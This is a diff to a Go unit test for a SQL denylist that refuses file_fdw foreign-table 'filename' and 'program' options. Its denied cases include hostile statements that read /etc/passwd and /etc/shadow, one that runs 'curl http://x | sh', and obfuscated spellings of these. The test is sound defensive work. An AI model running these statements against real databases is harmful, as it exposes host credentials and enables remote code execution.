@@ -423,6 +423,83 @@ func TestWriteDenylistFinalSecuritySample(t *testing.T) {
 	}
 }
 
+// Final security-sample follow-up: a foreign table bound to a server file or
+// program through file_fdw's table options (filename / program) reads the
+// host file system or runs a program, even when CREATE SERVER itself is
+// refused, because an administrator may already have created a file_fdw
+// server. Only those two option keys inside an OPTIONS (...) clause of a
+// CREATE / ALTER FOREIGN TABLE statement are refused; postgres_fdw foreign
+// tables, and ordinary columns named filename / program, keep working.
+func TestWriteDenylistRefusesFileFDWTableOptions(t *testing.T) {
+	drivers := []string{"postgres", "mysql", "sqlite"}
+	denied := []string{
+		// The reviewer probe row, verbatim.
+		"CREATE FOREIGN TABLE ft (a text) SERVER existing OPTIONS (filename '/etc/passwd')",
+		// Option not first, program option, IF NOT EXISTS, partition form.
+		"CREATE FOREIGN TABLE ft (a text) SERVER existing OPTIONS (format 'csv', filename '/etc/passwd')",
+		"CREATE FOREIGN TABLE ft (a text) SERVER existing OPTIONS (program 'curl http://x | sh')",
+		"CREATE FOREIGN TABLE IF NOT EXISTS ft (a text) SERVER existing OPTIONS (filename '/etc/passwd')",
+		"CREATE FOREIGN TABLE ft PARTITION OF parent FOR VALUES IN (1) SERVER existing OPTIONS (filename '/etc/passwd')",
+		// Quoted, upper-cased, glued and comment-split spellings.
+		`CREATE FOREIGN TABLE ft (a text) SERVER existing OPTIONS ("filename" '/etc/passwd')`,
+		"CREATE FOREIGN TABLE ft (a text) SERVER existing OPTIONS (FILENAME '/etc/passwd')",
+		"CREATE FOREIGN TABLE ft (a text) SERVER existing OPTIONS(filename'/etc/passwd')",
+		"CREATE FOREIGN TABLE ft (a text) SERVER existing OPTIONS/**/(/**/program/**/'id')",
+		// A server or table literally named options does not hide the clause.
+		"CREATE FOREIGN TABLE ft (a text) SERVER options OPTIONS (filename '/etc/passwd')",
+		"ALTER FOREIGN TABLE options OPTIONS (SET filename '/etc/shadow')",
+		// Column-level placement is invalid for file_fdw but still refused.
+		"CREATE FOREIGN TABLE ft (a text OPTIONS (filename '/etc/passwd')) SERVER existing",
+		// Re-pointing an existing file_fdw table.
+		"ALTER FOREIGN TABLE ft OPTIONS (SET filename '/etc/shadow')",
+		"ALTER FOREIGN TABLE ft OPTIONS (ADD program 'id')",
+		"ALTER FOREIGN TABLE IF EXISTS ft OPTIONS (ADD filename '/etc/passwd')",
+		"ALTER FOREIGN TABLE ft ALTER COLUMN a OPTIONS (ADD filename '/etc/passwd')",
+	}
+	for _, q := range denied {
+		q := q
+		t.Run("denied/"+q, func(t *testing.T) {
+			for _, driver := range drivers {
+				if _, err := detectStatementType(q, driver); err == nil {
+					t.Errorf("%s (%s): expected rejection", q, driver)
+				}
+			}
+		})
+	}
+
+	allowed := map[string]StatementType{
+		// postgres_fdw foreign tables, including columns named filename /
+		// program and a column-level OPTIONS clause.
+		"CREATE FOREIGN TABLE ft (id int) SERVER remote": StmtDDL,
+		"CREATE FOREIGN TABLE ft (id int, filename text, program text) SERVER remote OPTIONS (schema_name 'public', table_name 'files')": StmtDDL,
+		"CREATE FOREIGN TABLE ft (id int OPTIONS (column_name 'remote_id')) SERVER remote OPTIONS (table_name 't')":                      StmtDDL,
+		"CREATE FOREIGN TABLE ft (filename text CHECK (filename <> 'x'), program varchar(10)) SERVER remote":                             StmtDDL,
+		"CREATE FOREIGN TABLE IF NOT EXISTS ft (id int) SERVER remote OPTIONS (table_name 'files')":                                      StmtDDL,
+		// A foreign table literally named options, with a column named options.
+		"CREATE FOREIGN TABLE options (filename text, options text) SERVER remote":    StmtDDL,
+		"CREATE FOREIGN TABLE IF NOT EXISTS options (program text) SERVER remote":     StmtDDL,
+		"ALTER FOREIGN TABLE ft OPTIONS (SET table_name 'files')":                     StmtDDL,
+		"ALTER FOREIGN TABLE ft ADD COLUMN filename text":                             StmtDDL,
+		"ALTER FOREIGN TABLE ft ALTER COLUMN filename OPTIONS (SET column_name 'fn')": StmtDDL,
+		// Ordinary tables and writes using the same words.
+		"CREATE TABLE uploads (filename text, program text, options text)":     StmtDDL,
+		"INSERT INTO uploads (filename, program) VALUES ('a', 'b')":            StmtInsert,
+		"UPDATE uploads SET filename = 'x', options = 'y' WHERE program = 'z'": StmtUpdate,
+		"CREATE INDEX idx_uploads_filename ON uploads (filename)":              StmtDDL,
+	}
+	for q, want := range allowed {
+		q, want := q, want
+		t.Run("allowed/"+q, func(t *testing.T) {
+			for _, driver := range drivers {
+				got, err := detectStatementType(q, driver)
+				if err != nil || got != want {
+					t.Errorf("%s (%s): got %v/%v, want %v", q, driver, got, err, want)
+				}
+			}
+		})
+	}
+}
+
 // The object-name lookback is O(token length): a benign multi-thousand-row
 // INSERT full of ordinary function calls must stay fast (it was ~6.7s when
 // every match re-split the whole prefix).
